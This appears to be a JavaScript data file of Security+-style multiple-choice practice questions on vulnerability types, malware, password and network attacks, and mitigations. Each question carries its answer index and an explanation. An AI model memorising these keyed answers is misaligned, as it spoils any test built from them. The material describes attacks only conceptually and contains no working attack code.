  { id:"D2-026", domain:2, obj:"2.3", diff:"medium", q:"A flaw exists where two processes access shared data and the outcome depends on timing, producing inconsistent results. Which vulnerability is this?", options:["Buffer overflow","Race condition","Privilege escalation","Cross-site scripting"], answer:1, explain:"<strong>Race condition</strong> arises when an outcome depends on the timing of concurrent access to shared data, such as a time-of-check to time-of-use flaw.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow writes past allocated memory, which is a size issue, not a timing issue.</span><span class='qd'><b>Privilege escalation</b>: privilege escalation gains higher rights, which may result from a race but is not the timing flaw itself.</span><span class='qd'><b>Cross-site scripting</b>: XSS injects scripts into web pages and has nothing to do with concurrent process timing.</span>" },
  { id:"D2-027", domain:2, obj:"2.3", diff:"medium", q:"Which vulnerability describes a flaw that is unknown to the vendor and has no available patch when first exploited?", options:["End-of-life vulnerability","Legacy vulnerability","Zero-day","Default configuration"], answer:2, explain:"<strong>Zero-day</strong> is a vulnerability unknown to the vendor with no patch available, giving defenders zero days to prepare before exploitation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Legacy vulnerability</b>: a legacy flaw exists in an old system and is usually known, not an undisclosed brand-new weakness.</span><span class='qd'><b>Default configuration</b>: a default configuration weakness is a known insecure setting, not an unknown unpatched flaw.</span><span class='qd'><b>End-of-life vulnerability</b>: end-of-life flaws are unpatched because support ended, but they are typically already known, unlike a zero-day.</span>" },
  { id:"D2-028", domain:2, obj:"2.3", diff:"hard", q:"An organization runs an operating system that the vendor no longer supports with security updates. Which vulnerability category does this BEST represent?", options:["Race condition","Buffer overflow","Zero-day vulnerability","End-of-life / legacy system vulnerability"], answer:3, explain:"<strong>End-of-life / legacy system vulnerability</strong> applies when a vendor no longer issues security updates, leaving known flaws permanently unaddressed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Zero-day vulnerability</b>: a zero-day is an unknown flaw with no patch yet, whereas end-of-life systems lack patches because support ended.</span><span class='qd'><b>Race condition</b>: a race condition is a specific timing coding flaw, not the condition of running unsupported software.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow is a memory programming error, unrelated to a vendor ending support.</span>" },
  { id:"D2-029", domain:2, obj:"2.3", diff:"medium", q:"In a cloud environment, a customer's storage bucket is publicly readable due to an incorrect access setting. Which vulnerability type is this?", options:["Misconfiguration","Zero-day","Side-channel attack","Buffer overflow"], answer:0, explain:"<strong>Misconfiguration</strong> describes a publicly readable storage bucket caused by an incorrect access setting, a leading cause of cloud data exposure.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Zero-day</b>: a zero-day is an unknown software flaw, whereas this is a customer setting error, not a vendor bug.</span><span class='qd'><b>Side-channel attack</b>: a side-channel infers secrets from physical leakage like timing or power, not from an open access policy.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow is a memory overrun in code, unrelated to a permissions setting.</span>" },
  { id:"D2-030", domain:2, obj:"2.3", diff:"hard", q:"A virtualization platform is found to allow code in one guest VM to access the host or other guests. Which vulnerability does this describe?", options:["SQL injection","VM escape (virtualization vulnerability)","Cross-site scripting","DNS poisoning"], answer:1, explain:"<strong>VM escape (virtualization vulnerability)</strong> lets code break out of a guest VM to reach the hypervisor or other guests, defeating isolation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Cross-site scripting</b>: XSS runs scripts in a victim's browser, not code escaping a virtual machine boundary.</span><span class='qd'><b>DNS poisoning</b>: DNS poisoning corrupts name resolution, it does not break VM isolation.</span><span class='qd'><b>SQL injection</b>: SQL injection targets databases through input, unrelated to hypervisor isolation.</span>" },
  { id:"D2-031", domain:2, obj:"2.3", diff:"medium", q:"Which mobile-specific vulnerability results from a user removing manufacturer restrictions to gain full administrative control of the device?", options:["Memory injection","Sideloading","Jailbreaking / rooting","Resource exhaustion"], answer:2, explain:"<strong>Jailbreaking / rooting</strong> removes manufacturer restrictions to gain full administrative control, disabling built-in security controls.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Sideloading</b>: sideloading installs apps from outside the official store but does not by itself grant root or admin control.</span><span class='qd'><b>Resource exhaustion</b>: resource exhaustion depletes memory or CPU to cause denial of service, not removal of device restrictions.</span><span class='qd'><b>Memory injection</b>: memory injection inserts code into a running process, which is different from removing OS-level restrictions.</span>" },
  { id:"D2-032", domain:2, obj:"2.3", diff:"hard", q:"An attacker leverages a flaw in a widely used open-source library bundled into thousands of applications. Which vulnerability concept is MOST relevant?", options:["Race condition","Default credentials","Cryptographic downgrade","Supply chain / third-party software vulnerability"], answer:3, explain:"<strong>Supply chain / third-party software vulnerability</strong> applies when a flaw in a widely used shared library propagates to every application that bundles it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Race condition</b>: a race condition is a timing flaw in concurrent code, not a shared dependency risk.</span><span class='qd'><b>Default credentials</b>: default credentials are unchanged factory logins, unrelated to a vulnerable bundled library.</span><span class='qd'><b>Cryptographic downgrade</b>: a downgrade forces weaker crypto during negotiation, which is not the same as inheriting a library flaw.</span>" },
  { id:"D2-033", domain:2, obj:"2.3", diff:"easy", q:"Which vulnerability allows an attacker to insert malicious SQL statements through unvalidated user input?", options:["SQL injection","Buffer overflow","Race condition","Cross-site scripting"], answer:0, explain:"<strong>SQL injection</strong> exploits unvalidated input passed into database queries, letting attackers read or modify data they should not access.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Cross-site scripting</b>: XSS injects scripts that run in a victim's browser, not SQL statements into a database.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow overruns memory, it does not inject crafted queries into a database.</span><span class='qd'><b>Race condition</b>: a race condition is a timing flaw, unrelated to malicious database input.</span>" },
  { id:"D2-034", domain:2, obj:"2.3", diff:"medium", q:"A web application reflects unescaped user input back to other users' browsers, allowing script execution. Which vulnerability is this?", options:["Privilege escalation","Cross-site scripting (XSS)","SQL injection","Buffer overflow"], answer:1, explain:"<strong>Cross-site scripting (XSS)</strong> occurs when an app reflects unescaped user input into pages, letting attackers run scripts in other users' browsers.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SQL injection</b>: SQL injection targets the database with crafted queries, not scripts executed in a browser.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow overruns memory in an application, not script reflected to clients.</span><span class='qd'><b>Privilege escalation</b>: privilege escalation raises an attacker's access level and is not the act of injecting browser scripts.</span>" },
  { id:"D2-035", domain:2, obj:"2.3", diff:"hard", q:"A side-channel attack against a cryptographic implementation MOST commonly exploits which class of vulnerability?", options:["A default administrator password","An unpatched web server","Information leaked through timing, power, or electromagnetic emissions","A missing input validation routine"], answer:2, explain:"<strong>Information leaked through timing, power, or electromagnetic emissions</strong> is the class of vulnerability a side-channel attack exploits, inferring secrets from physical behavior.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A missing input validation routine</b>: missing validation enables injection attacks, not the physical leakage a side-channel uses.</span><span class='qd'><b>A default administrator password</b>: a default password is a credential weakness, not a physical emanation flaw.</span><span class='qd'><b>An unpatched web server</b>: an unpatched server is a software vulnerability, not a side-channel leakage of secrets.</span>" },
  { id:"D2-036", domain:2, obj:"2.3", diff:"medium", q:"Which term describes a vulnerability where an application fails to release memory it no longer needs, eventually exhausting resources?", options:["Buffer overflow","Integer overflow","Race condition","Memory leak"], answer:3, explain:"<strong>Memory leak</strong> occurs when allocated memory is never freed, gradually consuming available memory and potentially causing denial of service.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow writes past a buffer's bounds, it does not fail to release memory over time.</span><span class='qd'><b>Integer overflow</b>: an integer overflow is a numeric value exceeding its type's range, not unreleased memory.</span><span class='qd'><b>Race condition</b>: a race condition is a timing flaw between operations, unrelated to memory that is never freed.</span>" },
  { id:"D2-037", domain:2, obj:"2.3", diff:"hard", q:"An embedded IoT device cannot be patched and uses hardcoded credentials baked into firmware. Which TWO vulnerability characteristics are MOST evident?", options:["Hardcoded credentials and an unpatchable firmware vulnerability","Zero-day and SQL injection","XSS and side-channel","Race condition and memory leak"], answer:0, explain:"<strong>Hardcoded credentials and an unpatchable firmware vulnerability</strong> are the two evident weaknesses in an IoT device with baked-in logins that cannot be updated.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Race condition and memory leak</b>: neither a timing flaw nor unreleased memory is described in this hardcoded, unpatchable device.</span><span class='qd'><b>Zero-day and SQL injection</b>: nothing here is an undisclosed flaw or a database input attack.</span><span class='qd'><b>XSS and side-channel</b>: there is no browser script reflection or physical emanation leakage in this scenario.</span>" },
  { id:"D2-038", domain:2, obj:"2.3", diff:"medium", q:"Which vulnerability type is introduced when a developer leaves debugging features or verbose error messages enabled in production?", options:["Zero-day","Misconfiguration","Buffer overflow","Race condition"], answer:1, explain:"<strong>Misconfiguration</strong> describes leaving debug features or verbose error messages enabled in production, which can leak sensitive information.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Zero-day</b>: a zero-day is an unknown unpatched flaw, not a deliberate-but-insecure production setting.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow is a memory overrun, not a leftover debug configuration.</span><span class='qd'><b>Race condition</b>: a race condition is a timing flaw, unrelated to verbose errors left enabled.</span>" },
  { id:"D2-039", domain:2, obj:"2.3", diff:"easy", q:"What is the BEST general definition of a 'vulnerability' in security terms?", options:["A confirmed data breach","An active attack in progress","A weakness that could be exploited by a threat","A control that blocks attacks"], answer:2, explain:"<strong>A weakness that could be exploited by a threat</strong> is the standard definition of a vulnerability in security terms.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>An active attack in progress</b>: an attack in progress is an incident or exploit event, not the underlying weakness.</span><span class='qd'><b>A control that blocks attacks</b>: a control is a safeguard, the opposite of a weakness.</span><span class='qd'><b>A confirmed data breach</b>: a breach is a realized impact, not the latent weakness that allowed it.</span>" },
  { id:"D2-040", domain:2, obj:"2.3", diff:"hard", q:"A penetration test reveals that an application trusts data from a client-side check without re-validating it on the server. Which vulnerability does this BEST represent?", options:["Cryptographic downgrade","DNS poisoning","Resource exhaustion","Improper input validation / client-side trust"], answer:3, explain:"<strong>Improper input validation / client-side trust</strong> describes relying on a client-side check without re-validating on the server, since clients can be manipulated.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Cryptographic downgrade</b>: a downgrade forces weaker encryption, unrelated to trusting unverified client data.</span><span class='qd'><b>DNS poisoning</b>: DNS poisoning corrupts name resolution, not server trust of client-side validation.</span><span class='qd'><b>Resource exhaustion</b>: resource exhaustion depletes system capacity for a denial of service, not a validation trust flaw.</span>" },
  { id:"D2-041", domain:2, obj:"2.4", diff:"medium", q:"Which type of malware encrypts a victim's files and demands payment for the decryption key?", options:["Ransomware","Rootkit","Worm","Spyware"], answer:0, explain:"<strong>Ransomware</strong> encrypts a victim's files and demands payment, usually in cryptocurrency, for the decryption key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Spyware</b>: spyware secretly collects information, it does not encrypt files or demand a ransom.</span><span class='qd'><b>Rootkit</b>: a rootkit hides its presence to maintain stealthy access, not to extort payment via encryption.</span><span class='qd'><b>Worm</b>: a worm self-replicates across networks, which is about propagation, not file encryption for ransom.</span>" },
  { id:"D2-042", domain:2, obj:"2.4", diff:"easy", q:"Which malware type self-replicates and spreads across networks without requiring a host file or user action?", options:["Virus","Worm","Trojan","Logic bomb"], answer:1, explain:"<strong>Worm</strong> is self-replicating malware that spreads across networks on its own, without a host file or user action.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Virus</b>: a virus needs a host file and typically user action to execute and spread, unlike a self-propagating worm.</span><span class='qd'><b>Trojan</b>: a Trojan disguises itself as legitimate software and does not self-replicate.</span><span class='qd'><b>Logic bomb</b>: a logic bomb lies dormant until a trigger condition, it does not spread across networks.</span>" },
  { id:"D2-043", domain:2, obj:"2.4", diff:"medium", q:"A program appears to be a legitimate utility but secretly opens a backdoor when run. Which malware type is this?", options:["Bloatware","Worm","Trojan","Rootkit"], answer:2, explain:"<strong>Trojan</strong> disguises itself as legitimate software while performing malicious actions, such as opening a backdoor, when run.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Worm</b>: a worm self-replicates across networks rather than masquerading as a useful utility.</span><span class='qd'><b>Rootkit</b>: a rootkit focuses on hiding its presence to keep access, not on appearing to be a legitimate program.</span><span class='qd'><b>Bloatware</b>: bloatware is unwanted preinstalled software that is annoying but not disguised malware opening a backdoor.</span>" },
  { id:"D2-044", domain:2, obj:"2.4", diff:"hard", q:"An incident responder finds malware that hooks the operating system kernel to hide its files and processes from administrators. Which indicator and malware type are MOST consistent?", options:["Mass file encryption; ransomware","Self-propagation; worm","High CPU only; spyware","Hidden processes/files via kernel hooks; rootkit"], answer:3, explain:"<strong>Hidden processes/files via kernel hooks; rootkit</strong> matches malware that hooks the OS kernel to conceal itself from administrators.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>High CPU only; spyware</b>: spyware steals information and high CPU alone does not indicate kernel-level concealment.</span><span class='qd'><b>Mass file encryption; ransomware</b>: ransomware encrypts files for ransom, it does not hook the kernel to hide processes.</span><span class='qd'><b>Self-propagation; worm</b>: a worm's signature is spreading across hosts, not hiding files through kernel hooks.</span>" },
  { id:"D2-045", domain:2, obj:"2.4", diff:"medium", q:"Which password attack systematically tries every possible character combination until the correct one is found?", options:["Brute-force attack","Pass-the-hash","Rainbow table","Dictionary attack"], answer:0, explain:"<strong>Brute-force attack</strong> systematically tries every possible character combination until the correct password is found, exhaustive but slow.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Dictionary attack</b>: a dictionary attack tries a curated list of likely words, not every possible combination.</span><span class='qd'><b>Pass-the-hash</b>: pass-the-hash reuses a captured hash to authenticate, it does not guess characters.</span><span class='qd'><b>Rainbow table</b>: a rainbow table looks up precomputed hashes to reverse them, rather than trying combinations live.</span>" },
  { id:"D2-046", domain:2, obj:"2.4", diff:"hard", q:"Logs show many failed logins for one account from numerous IP addresses, followed by a success using a password reused from a prior public breach. Which attack is MOST likely?", options:["Rainbow table attack","Credential stuffing","SQL injection","On-path attack"], answer:1, explain:"<strong>Credential stuffing</strong> replays username and password pairs leaked from prior breaches across many sources, succeeding when users reuse passwords.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Rainbow table attack</b>: a rainbow table reverses stolen password hashes offline, but here a known reused plaintext password was tried directly.</span><span class='qd'><b>SQL injection</b>: SQL injection attacks a database through input, not repeated logins with breached credentials.</span><span class='qd'><b>On-path attack</b>: an on-path attack intercepts traffic between parties, which does not match distributed login attempts.</span>" },
  { id:"D2-047", domain:2, obj:"2.4", diff:"medium", q:"An attacker positions themselves between a client and server to intercept and possibly alter traffic. Which attack is this?", options:["Privilege escalation","Replay attack","On-path (man-in-the-middle) attack","Denial-of-service attack"], answer:2, explain:"<strong>On-path (man-in-the-middle) attack</strong> places the attacker between two parties to intercept and possibly alter their communications.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Denial-of-service attack</b>: a DoS aims to make a service unavailable, not to sit between parties reading traffic.</span><span class='qd'><b>Privilege escalation</b>: privilege escalation gains higher access on a system, not interception of a communication channel.</span><span class='qd'><b>Replay attack</b>: a replay resends previously captured data, which differs from actively relaying live traffic between two parties.</span>" },
  { id:"D2-048", domain:2, obj:"2.4", diff:"medium", q:"Which network attack overwhelms a target with traffic from many distributed compromised systems to make it unavailable?", options:["DNS poisoning","ARP spoofing","Replay attack","DDoS attack"], answer:3, explain:"<strong>DDoS attack</strong> uses many distributed compromised systems, often a botnet, to flood a target and exhaust its resources.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DNS poisoning</b>: DNS poisoning corrupts name resolution to misdirect users, it does not flood a target with traffic.</span><span class='qd'><b>ARP spoofing</b>: ARP spoofing redirects local traffic by forging MAC mappings, not a distributed flood for unavailability.</span><span class='qd'><b>Replay attack</b>: a replay resends captured authentication data, unrelated to overwhelming a target with volume.</span>" },
  { id:"D2-049", domain:2, obj:"2.4", diff:"hard", q:"An attacker captures a valid authentication token and resends it later to gain access. Which attack does this describe, and which control BEST mitigates it?", options:["Replay attack; use timestamps/nonces and session tokens","Brute-force; lengthen passwords","DDoS; rate limiting","XSS; output encoding"], answer:0, explain:"<strong>Replay attack; use timestamps/nonces and session tokens</strong> correctly names the attack and the controls that stop reused captured data from succeeding.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Brute-force; lengthen passwords</b>: brute-force guesses passwords, but the scenario reuses a captured token, not guessing.</span><span class='qd'><b>DDoS; rate limiting</b>: DDoS is a flooding attack, which does not match capturing and resending a valid token.</span><span class='qd'><b>XSS; output encoding</b>: XSS injects browser scripts, unrelated to replaying a captured authentication token.</span>" },
  { id:"D2-050", domain:2, obj:"2.4", diff:"medium", q:"Which cryptographic attack attempts to force two parties into using a weaker, breakable protocol or cipher?", options:["Birthday attack","Downgrade attack","Collision attack","Side-channel attack"], answer:1, explain:"<strong>Downgrade attack</strong> manipulates negotiation so parties fall back to a weaker protocol or cipher the attacker can break.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Birthday attack</b>: a birthday attack exploits hash collision probability, not protocol negotiation to weaken security.</span><span class='qd'><b>Collision attack</b>: a collision attack finds two inputs with the same hash, which is not forcing a weaker cipher.</span><span class='qd'><b>Side-channel attack</b>: a side-channel infers secrets from physical leakage, not from downgrading the negotiated protocol.</span>" },
  { id:"D2-051", domain:2, obj:"2.4", diff:"hard", q:"An analyst sees outbound traffic to an unfamiliar domain at regular intervals from many hosts, with small uniform payloads. Which indicator is MOST consistent?", options:["A buffer overflow exploit","A rainbow table lookup","Beaconing to a command-and-control server","Normal software update checks"], answer:2, explain:"<strong>Beaconing to a command-and-control server</strong> matches regular, uniform outbound connections to an unknown domain from many hosts, a classic C2 indicator.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Normal software update checks</b>: legitimate updates go to known vendor domains, not an unfamiliar one across many hosts in lockstep.</span><span class='qd'><b>A buffer overflow exploit</b>: a buffer overflow is a memory attack on a single process, not periodic outbound network traffic.</span><span class='qd'><b>A rainbow table lookup</b>: a rainbow table lookup is an offline hash-cracking activity, not network beaconing.</span>" },
  { id:"D2-052", domain:2, obj:"2.4", diff:"medium", q:"Which malware indicator BEST suggests a logic bomb rather than a worm?", options:["Mass encryption of user files","Disguising itself as a legitimate app","Rapid self-propagation across the network","Malicious code that triggers only on a specific date or condition"], answer:3, explain:"<strong>Malicious code that triggers only on a specific date or condition</strong> best indicates a logic bomb, which lies dormant until its trigger is met.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Rapid self-propagation across the network</b>: rapid spreading is the hallmark of a worm, not a dormant conditional payload.</span><span class='qd'><b>Mass encryption of user files</b>: mass encryption indicates ransomware, not a condition-triggered logic bomb.</span><span class='qd'><b>Disguising itself as a legitimate app</b>: masquerading as legitimate software describes a Trojan, not a logic bomb.</span>" },
  { id:"D2-053", domain:2, obj:"2.5", diff:"medium", q:"Which mitigation technique reduces risk by removing unnecessary services, applications, and accounts from a system?", options:["Hardening","Segmentation","Encryption","Least privilege"], answer:0, explain:"<strong>Hardening</strong> reduces the attack surface by disabling or removing unneeded services, software, ports, and default accounts.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Segmentation</b>: segmentation isolates network zones to limit spread, it does not strip unnecessary services from a host.</span><span class='qd'><b>Encryption</b>: encryption protects data confidentiality, it does not remove unneeded services or accounts.</span><span class='qd'><b>Least privilege</b>: least privilege limits account permissions, which is distinct from removing services and software during hardening.</span>" },
  { id:"D2-054", domain:2, obj:"2.5", diff:"easy", q:"Which mitigation technique divides a network into isolated zones to limit the spread of an attacker who breaches one area?", options:["Patching","Segmentation","Default configuration","Logging"], answer:1, explain:"<strong>Segmentation</strong> divides a network into isolated zones so a compromise in one segment cannot easily spread to others.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Patching</b>: patching fixes known software flaws, it does not partition the network to contain lateral movement.</span><span class='qd'><b>Default configuration</b>: a default configuration is often insecure and is not a mitigation that isolates network zones.</span><span class='qd'><b>Logging</b>: logging records events for detection, but it does not divide the network to limit an attacker's spread.</span>" },
  { id:"D2-055", domain:2, obj:"2.5", diff:"hard", q:"After a breach via an over-privileged service account, which mitigation would MOST directly prevent recurrence?", options:["Adding more guest Wi-Fi access points","Enabling verbose logging only","Applying least privilege to restrict the account's permissions","Increasing the firewall throughput"], answer:2, explain:"<strong>Applying least privilege to restrict the account's permissions</strong> most directly prevents recurrence by limiting an account to only the access it needs.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Enabling verbose logging only</b>: logging aids detection after the fact but does not reduce the excessive permissions that caused the breach.</span><span class='qd'><b>Increasing the firewall throughput</b>: throughput affects performance, not the over-privileged account that was abused.</span><span class='qd'><b>Adding more guest Wi-Fi access points</b>: more access points expand exposure and do nothing to constrain account permissions.</span>" }
);
SECPLUS.questions.push(
  { id:"D2-056", domain:2, obj:"2.4", diff:"easy", q:"A user receives an email claiming to be from the IT help desk asking them to click a link and confirm their password to avoid account lockout. Which attack does this describe?", options:["Brute force","On-path attack","Buffer overflow","Phishing"], answer:3, explain:"<strong>Phishing</strong> uses a fraudulent message impersonating a trusted source, here the IT help desk, to trick the victim into revealing credentials or clicking a malicious link.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Brute force</b>: brute force repeatedly guesses passwords against a system, not tricking a user into volunteering one via email.</span><span class='qd'><b>On-path attack</b>: an on-path attack intercepts traffic between two parties in transit, not soliciting credentials through a deceptive message.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow exploits a memory-handling flaw in software, which is a technical code vulnerability, not a social-engineering email.</span>" },
  { id:"D2-057", domain:2, obj:"2.4", diff:"easy", q:"Which malware type encrypts a victim's files and demands payment for the decryption key?", options:["Ransomware","Keylogger","Spyware","Rootkit"], answer:0, explain:"<strong>Ransomware</strong> encrypts the victim's data and extorts them by withholding the decryption key until a ransom is paid.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Rootkit</b>: a rootkit hides at a low level to maintain stealthy privileged access, it does not encrypt files for extortion.</span><span class='qd'><b>Keylogger</b>: a keylogger captures keystrokes to steal input such as passwords, not encrypt and ransom files.</span><span class='qd'><b>Spyware</b>: spyware covertly gathers information about the user, it does not lock data behind a demanded payment.</span>" },
  { id:"D2-058", domain:2, obj:"2.4", diff:"easy", q:"An attacker tries one common password, such as <code class='mono'>Spring2025!</code>, against many different user accounts. Which attack is this?", options:["Rainbow table","Password spraying","Credential stuffing","Dictionary attack"], answer:1, explain:"<strong>Password spraying</strong> tries a single common password across many accounts to stay under each account's lockout threshold.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Dictionary attack</b>: a dictionary attack tries many wordlist passwords against one account, the reverse of spraying one password across many accounts.</span><span class='qd'><b>Rainbow table</b>: a rainbow table reverses captured password hashes offline using precomputed values, not live login attempts.</span><span class='qd'><b>Credential stuffing</b>: credential stuffing reuses known username and password pairs leaked from breaches, not one guessed common password.</span>" },
  { id:"D2-059", domain:2, obj:"2.4", diff:"easy", q:"Which web attack injects malicious script into a page so it executes in other users' browsers?", options:["CSRF","SQL injection","Cross-site scripting (XSS)","Directory traversal"], answer:2, explain:"<strong>Cross-site scripting (XSS)</strong> injects client-side script into a page so it executes in other users' browsers, enabling session theft or content manipulation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>SQL injection</b>: SQL injection targets the backend database through crafted input, it does not run script in victims' browsers.</span><span class='qd'><b>Directory traversal</b>: directory traversal uses path sequences to read files outside the web root, not inject browser-executed script.</span><span class='qd'><b>CSRF</b>: CSRF forces an authenticated browser to submit an unwanted request, it abuses an existing session rather than injecting script.</span>" },
  { id:"D2-060", domain:2, obj:"2.4", diff:"easy", q:"A flood of traffic from thousands of compromised hosts overwhelms a web server, making it unavailable. What is this?", options:["Replay attack","Privilege escalation","Pharming","DDoS attack"], answer:3, explain:"<strong>DDoS attack</strong> uses many compromised systems, often a botnet, to flood a target and exhaust its resources, making it unavailable.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Replay attack</b>: a replay attack reuses captured legitimate traffic to impersonate a sender, it does not flood a server with volume.</span><span class='qd'><b>Privilege escalation</b>: privilege escalation gains higher access rights on a system, not a traffic flood denying availability.</span><span class='qd'><b>Pharming</b>: pharming redirects users to a fraudulent site via DNS or hosts-file poisoning, it does not overwhelm a server.</span>" },
  { id:"D2-061", domain:2, obj:"2.4", diff:"easy", q:"Which malware secretly records every keystroke a user types to capture credentials?", options:["Keylogger","Adware","Worm","Logic bomb"], answer:0, explain:"<strong>Keylogger</strong> captures every keystroke a user types, commonly to steal usernames, passwords, and other sensitive input.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Worm</b>: a worm self-replicates and spreads across networks, it does not record keystrokes.</span><span class='qd'><b>Logic bomb</b>: a logic bomb waits for a trigger condition to release a payload, not silently log typing.</span><span class='qd'><b>Adware</b>: adware displays unwanted advertisements and may track browsing, it does not capture raw keystrokes.</span>" },
  { id:"D2-062", domain:2, obj:"2.4", diff:"easy", q:"A collection of internet-connected devices infected with malware and controlled remotely by an attacker is called a:", options:["Honeynet","Botnet","Subnet","Sandbox"], answer:1, explain:"<strong>Botnet</strong> is a network of compromised devices controlled by a command-and-control server, often used for DDoS or spam.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Honeynet</b>: a honeynet is a deliberately deployed decoy network to lure and study attackers, not attacker-controlled infected devices.</span><span class='qd'><b>Subnet</b>: a subnet is a logical subdivision of an IP network, a normal addressing concept with no malicious control implied.</span><span class='qd'><b>Sandbox</b>: a sandbox is an isolated environment for safely running or analyzing code, not a collection of infected hosts.</span>" },
  { id:"D2-063", domain:2, obj:"2.4", diff:"easy", q:"Which attack inserts malicious SQL into an application input field to manipulate the backend database?", options:["Session hijacking","XSS","SQL injection","On-path attack"], answer:2, explain:"<strong>SQL injection</strong> submits crafted input that the application passes to the database, allowing unauthorized queries or data access.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>XSS</b>: XSS injects script that runs in users' browsers, it manipulates the client side rather than the backend database.</span><span class='qd'><b>On-path attack</b>: an on-path attack intercepts network traffic between two parties, it does not inject SQL into an input field.</span><span class='qd'><b>Session hijacking</b>: session hijacking steals or takes over a valid session token, not inject database commands.</span>" },
  { id:"D2-064", domain:2, obj:"2.4", diff:"easy", q:"Malware that disguises itself as legitimate software but performs malicious actions once installed is a:", options:["Worm","Rootkit","Bot","Trojan"], answer:3, explain:"<strong>Trojan</strong> masquerades as benign software to trick users into running it, then carries out hidden malicious functions.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Worm</b>: a worm self-replicates and spreads automatically across networks, it does not rely on disguising itself as legitimate software.</span><span class='qd'><b>Rootkit</b>: a rootkit conceals privileged access from the OS, its defining trait is stealth, not posing as desirable software.</span><span class='qd'><b>Bot</b>: a bot is a compromised host taking remote commands as part of a botnet, not specifically disguised legitimate-looking software.</span>" },
  { id:"D2-065", domain:2, obj:"2.4", diff:"easy", q:"Which attack captures and retransmits valid data, such as an authentication token, to gain unauthorized access?", options:["Replay attack","Brute force","Downgrade attack","Phishing"], answer:0, explain:"<strong>Replay attack</strong> reuses captured legitimate traffic, such as an authentication token, to impersonate the original sender.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Brute force</b>: brute force guesses credentials by trying combinations, it does not capture and resend valid data.</span><span class='qd'><b>Downgrade attack</b>: a downgrade attack forces use of a weaker protocol or cipher, not retransmission of captured tokens.</span><span class='qd'><b>Phishing</b>: phishing tricks a user into revealing information via a deceptive message, not replaying intercepted traffic.</span>" },
  { id:"D2-066", domain:2, obj:"2.4", diff:"easy", q:"Malware designed to provide privileged, hidden, persistent access while concealing its presence from the OS is a:", options:["Keylogger","Rootkit","Spyware","Bloatware"], answer:1, explain:"<strong>Rootkit</strong> hides at a low level, often kernel mode, to maintain stealthy privileged and persistent access while evading detection.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Keylogger</b>: a keylogger records keystrokes, it is not defined by hiding privileged persistent access from the OS.</span><span class='qd'><b>Spyware</b>: spyware covertly collects user information but does not specifically grant concealed privileged system access.</span><span class='qd'><b>Bloatware</b>: bloatware is unnecessary preinstalled software that wastes resources, it is not malicious stealth access.</span>" },
  { id:"D2-067", domain:2, obj:"2.4", diff:"easy", q:"An attacker positions themselves between two communicating parties to intercept and possibly alter traffic. This is a(n):", options:["Buffer overflow","DDoS attack","On-path attack","Logic bomb"], answer:2, explain:"<strong>On-path attack</strong>, formerly man-in-the-middle, intercepts traffic between two parties, allowing eavesdropping or modification.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DDoS attack</b>: a DDoS attack floods a target to deny availability, it does not sit between parties to intercept traffic.</span><span class='qd'><b>Logic bomb</b>: a logic bomb is malware triggered by a condition, not a positioned interception of communications.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow exploits a memory-handling flaw in code, it is unrelated to intercepting traffic between two hosts.</span>" },
